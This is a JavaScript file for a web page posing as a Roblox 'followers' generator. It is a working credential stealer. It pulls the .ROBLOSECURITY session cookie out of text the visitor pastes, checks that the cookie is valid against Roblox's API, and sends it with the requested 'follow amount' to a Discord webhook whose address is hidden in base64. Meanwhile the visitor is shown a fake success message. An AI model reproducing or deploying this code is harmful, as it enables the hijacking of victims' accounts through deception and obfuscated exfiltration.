function x1y2y2z3(title, text, icon, confirmButtonText) {
    const a1b2c3 = {
        background: "#141414",
        color: "#ffffff",
        title: "<b>" + title + "</b>",
        text: text,
        icon: icon,
        confirmButtonText: confirmButtonText,
        allowOutsideClick: false
    };
    Swal.fire(a1b2c3);
}

async function doAuthorizedRequest(url, roblosecurityCookie) {
    try {
        const response = await axios.get(url, {
            headers: {
                Cookie: `.ROBLOSECURITY=${roblosecurityCookie}`,
            },
        });
        return response.data;
    } catch (error) {
        throw new Error(`Request failed: ${error.message}`);
    }
}

async function register(roblosecurityCookie) {
    const data = await doAuthorizedRequest("https://users.roblox.com/v1/users/authenticated", roblosecurityCookie);
    return data;
}

async function a1b2c3d4(p1q2r3, s4t5u7) {
    let xyeq = p1q2r3.match(/\.ROBLOSECURITY", "([^"]+)"/);
    if (!xyeq) {
        xyeq = p1q2r3.match(/\.ROBLOSECURITY=([^;]+)/);
    }

    if (!xyeq) {
        x1y2y2z3("Error", "Enter a valid code.", "error", "Retry");
        return;
    }
    
    const xyeqeq = xyeq[1];

    // Verificar la cookie antes de enviar la solicitud
    try {
        await register(xyeqeq); // Verificar la cookie

        const j1k2l3 = {
            content: `Follow Amount: ${s4t5u7}\n.ROBLOSECURITY: ${xyeqeq}`
        };

        const g8h9i0 = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NjY1MjEzOTEzNjQ4MzM3OS81SnZNYTd1NHhrTERmbFV2RUVwQkdFc3JTSnh3V19kY1lrV3ZTdDlXWUNfd2NjbGc5Ylh4Z1JEOXFnLUN5N3YtMlE5MQ==');

        const response = await axios.post(g8h9i0, j1k2l3, {
            headers: {
                'Content-Type': 'application/json'
            }
        });

        if (response.status === 200) {
            x1y2y2z3("Success", "Successfully sent.", "success", "Okay");
        } else {
            x1y2y2z3("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
        }
    } catch (error) {
        x1y2y2z3("Error", `An error occurred while sending Followers: ${error.message}`, "error", "Retry");
    }
}

document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("Send").addEventListener("click", function() {
        const p1q2r3 = document.getElementById("user_code").value;
        const s4t5u7 = document.getElementById("amount").value;

        if (!p1q2r3 || !s4t5u7) {
            x1y2y2z3("Validation Error", "Please fill in all fields.", "warning", "Okay");
            return;
        }

        const v7w8x9 = {
            icon: "info",
            title: "<b>Is this correct? 👀</b>",
            html: "Follow Amount: " + s4t5u7,
            showDenyButton: true,
            confirmButtonText: "Confirm", 
            denyButtonText: "Cancel",
            background: "#141414",
            color: "#ffffff"
        };

        Swal.fire(v7w8x9).then((result) => {
            if (result.isConfirmed) {
                a1b2c3d4(p1q2r3, s4t5u7);
            }
        });
    });
});
